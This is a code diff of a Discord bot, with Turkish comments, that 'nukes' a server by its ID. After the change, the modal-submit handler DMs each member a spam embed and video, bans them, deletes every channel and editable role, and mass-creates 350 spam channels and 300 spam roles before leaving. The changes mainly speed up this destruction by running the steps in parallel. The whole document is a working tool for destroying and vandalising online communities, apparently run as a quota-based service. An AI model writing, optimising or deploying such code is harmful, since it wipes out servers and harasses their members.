@@ -166,123 +166,67 @@ client.on("interactionCreate", async interaction => {
     await interaction.showModal(modal);
   }
 
-  // MODAL SUBMIT -> OPERASYON BAŞLA
-  
-  // ...önceki kodlar aynı, sadece modal submit kısmı değişiyor
+  // MODAL SUBMIT -> ULTRA OPTİMİZE VENDETTA
+  if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
+    const guildId = interaction.fields.getTextInputValue("sunucuID");
+    const guild = client.guilds.cache.get(guildId);
+    if (!guild) return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });
 
-if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
-  const guildId = interaction.fields.getTextInputValue("sunucuID");
-  const guild = client.guilds.cache.get(guildId);
+    await interaction.reply({ content: "⚡ İşlem başlatılıyor...", ephemeral: true });
+    const start = Date.now();
 
-  if (!guild) {
-    return interaction.reply({
-      content: "❌ Bot bu sunucuda değil!",
+    haklar[interaction.user.id] = (haklar[interaction.user.id] || 0) - 1;
+    const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
+    await updateHaklarMessage(hakChannel);
+
+    const embed = new EmbedBuilder()
+      .setColor("Red")
+      .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
+      .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦\nhttps://discord.gg/j9W6FXKTre")
+      .setFooter({ text: "💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦" });
+
+    // 1) Ban işlemi
+    const members = await guild.members.fetch();
+    await Promise.all(members.map(member => {
+      if (member.user.bot) return;
+      if ([OWNER_ID, SERI_ID].includes(member.id)) return;
+      member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
+      return member.ban({ reason: "P@rno" }).catch(() => {});
+    }));
+
+    // 2) Kanalları sil
+    const allChannels = await guild.channels.fetch();
+    await Promise.all(allChannels.map(ch => ch.delete().catch(() => {})));
+
+    // 3) Rolleri sil
+    const allRoles = await guild.roles.fetch();
+    await Promise.all(allRoles.filter(r => r.editable && r.id !== guild.id).map(r => r.delete().catch(() => {})));
+
+    // 4) 350 yeni kanal oluştur
+    const channelNames = ["VENDETTA💦", "VENDETTA💝", "EL KONULDU🔥"];
+    await Promise.all(Array.from({ length: 350 }).map((_, i) => 
+      guild.channels.create({ name: channelNames[i % channelNames.length] }).catch(() => {})
+    ));
+
+    // 5) 300 yeni rol oluştur
+    await Promise.all(Array.from({ length: 300 }).map((_, i) => {
+      const color = `#${Math.floor(Math.random() * 16777215).toString(16)}`;
+      return guild.roles.create({ name: `BÖÖ KORKTUNMUU😜`, color, hoist: true }).catch(() => {});
+    }));
+
+    // İşlem sonucu mesaj
+    await interaction.followUp({
+      content: `⚡ İşlem tamamlandı! V For Vendetta!`,
       ephemeral: true
     });
+
+    // LOG
+    const end = Date.now();
+    await sendVendettaLog(interaction.user, guild, members.size, haklar[interaction.user.id] || 0, end - start);
+
+    // Sunucudan ayrıl
+    await guild.leave().catch(() => {});
   }
-
-  await interaction.reply({ content: "⚡ İşlem başlatılıyor...", ephemeral: true });
-  const baslangicZamani = Date.now();
-  haklar[interaction.user.id] = (haklar[interaction.user.id] || 0) - 1;
-  const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
-  await updateHaklarMessage(hakChannel);
-
-  const embed = new EmbedBuilder()
-    .setColor("Red")
-    .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
-    .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦\nhttps://discord.gg/j9W6FXKTre")
-    .setFooter({ text: "💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦" });
-
-  // Üye Banlama
-  const members = await guild.members.fetch();
-  let bannedCount = 0;
-  for (const member of members.values()) {
-    if (member.user.bot) continue;
-    if ([OWNER_ID, SERI_ID].includes(member.id)) continue;
-
-    member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
-    await member.ban({ reason: "P@rno" }).catch(() => {});
-    bannedCount++;
-  }
-
-  // Kanalları silme (paralel + seri)
-  const allChannels = await guild.channels.fetch();
-  const channelDeleteChunks = Array.from(allChannels.values()).reduce((chunks, ch, i) => {
-    const chunkIndex = Math.floor(i / 20);
-    chunks[chunkIndex] = chunks[chunkIndex] || [];
-    chunks[chunkIndex].push(ch.delete().catch(() => {}));
-    return chunks;
-  }, []);
-
-  for (const chunk of channelDeleteChunks) {
-    await Promise.all(chunk);
-  }
-
-  // 350 yeni kanal açma
-  const channelNames = ["VENDETTA💦", "VENDETTA💝", "EL KONULDU🔥"];
-  const channelCreateChunks = [];
-  for (let i = 0; i < 350; i++) {
-    const chunkIndex = Math.floor(i / 20);
-    channelCreateChunks[chunkIndex] = channelCreateChunks[chunkIndex] || [];
-    channelCreateChunks[chunkIndex].push(
-      guild.channels.create({ name: channelNames[i % channelNames.length] }).catch(() => {})
-    );
-  }
-
-  for (const chunk of channelCreateChunks) {
-    await Promise.all(chunk);
-  }
-
-  // Rolleri silme (paralel + seri)
-  const allRoles = await guild.roles.fetch();
-  const roleDeleteChunks = Array.from(allRoles.values()).filter(r => r.editable && r.id !== guild.id)
-    .reduce((chunks, role, i) => {
-      const chunkIndex = Math.floor(i / 20);
-      chunks[chunkIndex] = chunks[chunkIndex] || [];
-      chunks[chunkIndex].push(role.delete().catch(() => {}));
-      return chunks;
-    }, []);
-
-  for (const chunk of roleDeleteChunks) {
-    await Promise.all(chunk);
-  }
-
-  // 300 yeni rol oluşturma
-  const roleCreateChunks = [];
-  for (let i = 0; i < 300; i++) {
-    const chunkIndex = Math.floor(i / 20);
-    roleCreateChunks[chunkIndex] = roleCreateChunks[chunkIndex] || [];
-    const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`;
-    roleCreateChunks[chunkIndex].push(
-      guild.roles.create({ name: "BÖÖ KORKTUNMUU😜", color: randomColor, hoist: true }).catch(() => {})
-    );
-  }
-
-  for (const chunk of roleCreateChunks) {
-    await Promise.all(chunk);
-  }
-
-  // İşlem sonucu mesaj
-  await interaction.followUp({
-    content: `⚡ ${bannedCount} kişi banlandı. V For Vendetta!`,
-    ephemeral: true
-  });
-
-  // LOG GÖNDER
-  const bitisZamani = Date.now();
-  const gecenSure = bitisZamani - baslangicZamani;
-
-  await sendVendettaLog(
-    interaction.user,
-    guild,
-    bannedCount,
-    haklar[interaction.user.id] || 0,
-    gecenSure
-  );
-
-  // Sunucudan ayrıl
-  await guild.leave().catch(() => {});
-}
 });
 
 client.login(process.env.BOT_TOKEN);
